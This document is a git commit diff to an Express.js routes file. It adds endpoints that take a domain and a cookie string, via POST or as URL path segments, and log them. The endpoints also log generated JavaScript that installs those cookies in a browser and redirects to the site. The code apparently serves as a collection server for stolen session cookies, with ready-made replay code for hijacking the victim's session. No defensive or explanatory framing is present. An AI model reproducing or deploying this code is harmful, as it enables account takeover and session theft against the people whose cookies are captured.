698e624578e04e6198f3d95782e8d9c4d02118b2
mico <javier.garcia454@gmail.com>
2015-04-22 11:27:03 -0500

    modificado: routes/index.js

--- routes/index.js
+++ routes/index.js
@@ -1,12 +1,9 @@
 var express = require('express');
 var router = express.Router();
 
-/* GET home page. */
-router.post('/session', function(req, res, next) {
-  console.log("----------"+req.body.domain+"---------");
-    var cookie = req.body.cookie;
+//Generator javascript (import cookie) 
+function codeJS(domain, cookie){
 	var arrCookie= cookie.split(';');
-	//Generator javascript (import cookie) 
 	var salida = "var date = new Date();date.setTime(date.getTime()+(1*24*60*60*1000));var expires = '; expires='+date.toGMTString();"
 	for(var i =0;i<arrCookie.length;i++){
 		var name = arrCookie[i].split('=')[0].trim();
@@ -14,11 +11,21 @@ router.post('/session', function(req, res, next) {
 		salida +="document.cookie = '"+name+"="+value+"'+expires+'; path=/';" 
 	}
 	//add reload (F5)
-	salida+="document.location.href='http://"+req.body.domain+"';";
-	console.log(salida);
+	salida+="document.location.href='http://"+domain+"';";
+	return salida;
+}
+
+router.all('/session', function(req, res, next) {
+	console.log("----------"+req.body.domain+"---------");
+    console.log(codeJS(req.body.domain,req.body.cookie));
 	console.log('-----------------------------------------');
 	res.send("foorbar");
-  
+});
+router.all('/session/:domain/:cookie', function(req, res, next) {
+	console.log("----------"+req.params.domain+"---------");
+    console.log(codeJS(req.params.domain,req.params.cookie));
+	console.log('-----------------------------------------');
+	res.send("foorbar");
 });
 
 module.exports = router;
